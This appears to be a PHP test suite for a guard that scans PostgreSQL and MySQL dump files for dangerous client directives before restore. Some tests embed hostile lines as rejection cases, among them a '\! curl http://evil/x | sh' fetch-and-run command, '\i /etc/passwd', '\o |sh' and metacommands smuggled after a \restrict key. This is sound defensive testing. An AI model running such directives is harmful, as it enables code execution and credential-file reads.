<?php

declare(strict_types=1);

use Devuni\Notifier\Services\Database\SqlDirectiveGuard;

function writeSqlDump(string $content): string
{
    $path = tempnam(sys_get_temp_dir(), 'sqlguard_').'.sql';
    file_put_contents($path, $content);

    return $path;
}

describe('SqlDirectiveGuard::assertPostgresSafe', function () {
    it('accepts a genuine pg_dump whose COPY data starts with backslash escapes', function () {
        // Real pg_dump plain output: SQL statements + a COPY ... FROM stdin block
        // whose data lines legitimately begin with \t, \N, \\, and end with \.
        $dump = implode("\n", [
            'SET statement_timeout = 0;',
            'CREATE TABLE public.t (id integer, note text);',
            'COPY public.t (id, note) FROM stdin;',
            "1\t\\tindented value",   // second field value starts with an escaped tab
            "\\N\tfirst field is null", // data line that STARTS with a backslash escape
            "3\tback\\\\slash",
            '\.',
            'ALTER TABLE public.t ADD CONSTRAINT t_pkey PRIMARY KEY (id);',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertPostgresSafe($path);

        expect(true)->toBeTrue(); // reached only if no exception was thrown

        @unlink($path);
    });

    it('rejects a \\! shell metacommand outside a COPY block', function () {
        $path = writeSqlDump("SELECT 1;\n\\! curl http://evil/x | sh\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    });

    it('rejects \\i include and \\copy file directives', function () {
        foreach (['\\i /etc/passwd', "\\copy t to program 'sh -c id'", '\\o |sh', '\\gexec'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });

    it('does NOT let a \\! smuggled after a COPY block go unnoticed', function () {
        // The block terminates at \. so the metacommand after it must be caught.
        $dump = implode("\n", [
            'COPY public.t (id) FROM stdin;',
            '1',
            '\.',
            '\! id',
        ])."\n";

        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class);

        @unlink($path);
    });

    it('accepts the \\restrict and \\unrestrict lines a current pg_dump writes', function () {
        // Trimmed from real pg_dump 16.15 plain output, made with PostgresDumper's
        // flags. The two directives frame the script; the key is random per dump.
        $key = 'SUcKxjXdfzrRSno7LpLZsOlzfthakYl6UjeOS7WwYeCPkljyJg4WPpdlMrkY8CV';

        $dump = implode("\n", [
            '--',
            '-- PostgreSQL database dump',
            '--',
            '',
            '\restrict '.$key,
            '',
            '-- Dumped from database version 16.15',
            '-- Dumped by pg_dump version 16.15',
            '',
            'SET statement_timeout = 0;',
            'CREATE TABLE public.raw_lines (line text, n integer);',
            'COPY public.raw_lines (line, n) FROM stdin;',
            "\\\\restrict looksLikeADirective\t1",
            "\\\\! not a directive, just data\t2",
            "\\N\t3",
            '\.',
            '',
            '--',
            '-- PostgreSQL database dump complete',
            '--',
            '',
            '\unrestrict '.$key,
            '',
        ])."\n";

        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    });

    it('accepts a well-formed restrict line', function (string $line) {
        $path = writeSqlDump("SELECT 1;\n".$line."\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->not->toThrow(RuntimeException::class);

        @unlink($path);
    })->with([
        'restrict' => ['\restrict abc123'],
        'unrestrict' => ['\unrestrict abc123'],
        'single-character key' => ['\restrict a'],
        '128-character key' => ['\restrict '.str_repeat('a', 128)],
        'indented' => ['  \restrict abc123'],
        'trailing spaces' => ['\restrict abc123  '],
        'CRLF line ending' => ["\\restrict abc123\r"],
    ]);

    it('refuses a restrict line that is not exactly the directive and a key', function (string $line) {
        $path = writeSqlDump("SELECT 1;\n".$line."\n");

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    })->with([
        'restrict without a key' => ['\restrict'],
        'unrestrict without a key' => ['\unrestrict'],
        'trailing space but no key' => ['\restrict '],
        'second metacommand after the key' => ['\restrict abc123 \! id'],
        'second metacommand after the unrestrict key' => ['\unrestrict abc123 \! id'],
        'metacommand glued to the key' => ['\restrict abc123\! id'],
        'metacommand after a bare carriage return' => ["\\restrict abc123\r\\! id"],
        'second argument' => ['\restrict abc123 def456'],
        'semicolon after the key' => ['\restrict abc123;'],
        'quoted key' => ["\\restrict 'abc123'"],
        'variable as the key' => ['\restrict :key'],
        'punctuation in the key' => ['\restrict abc-123'],
        'non-ASCII key' => ['\restrict abč123'],
        '129-character key' => ['\restrict '.str_repeat('a', 129)],
        'tab before the key' => ["\\restrict\tabc123"],
        'two spaces before the key' => ['\restrict  abc123'],
        'no space before the key' => ['\restrictabc123'],
        'upper-case directive' => ['\RESTRICT abc123'],
        'longer directive name' => ['\restricted abc123'],
    ]);

    it('keeps refusing a metacommand on the lines around an allowed restrict line', function (string $dump) {
        $path = writeSqlDump($dump);

        expect(fn () => SqlDirectiveGuard::assertPostgresSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    })->with([
        'before restrict' => ["\\! id\n\\restrict abc123\n"],
        'between restrict and unrestrict' => ["\\restrict abc123\n\\! id\n\\unrestrict abc123\n"],
        'after unrestrict' => ["\\restrict abc123\n\\unrestrict abc123\n\\! id\n"],
    ]);
});

describe('SqlDirectiveGuard::assertMysqlSafe', function () {
    it('accepts a genuine mysqldump INSERT dump', function () {
        $dump = implode("\n", [
            '-- MySQL dump 10.13',
            '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;',
            'DROP TABLE IF EXISTS `t`;',
            'CREATE TABLE `t` (`id` int NOT NULL, `note` text);',
            "INSERT INTO `t` VALUES (1,'a back\\\\slash value'),(2,'plain');",
            'UNLOCK TABLES;',
        ])."\n";

        $path = writeSqlDump($dump);

        SqlDirectiveGuard::assertMysqlSafe($path);

        expect(true)->toBeTrue();

        @unlink($path);
    });

    it('rejects \\!, system and source client directives', function () {
        foreach (['\\! id', 'system id', 'source /etc/passwd'] as $directive) {
            $path = writeSqlDump("SELECT 1;\n".$directive."\n");

            expect(fn () => SqlDirectiveGuard::assertMysqlSafe($path))
                ->toThrow(RuntimeException::class);

            @unlink($path);
        }
    });

    it('does not extend the pg_dump restrict allowance to the mysql client', function () {
        $path = writeSqlDump("SELECT 1;\n\\restrict abc123\n");

        expect(fn () => SqlDirectiveGuard::assertMysqlSafe($path))
            ->toThrow(RuntimeException::class, 'client directive');

        @unlink($path);
    });
});
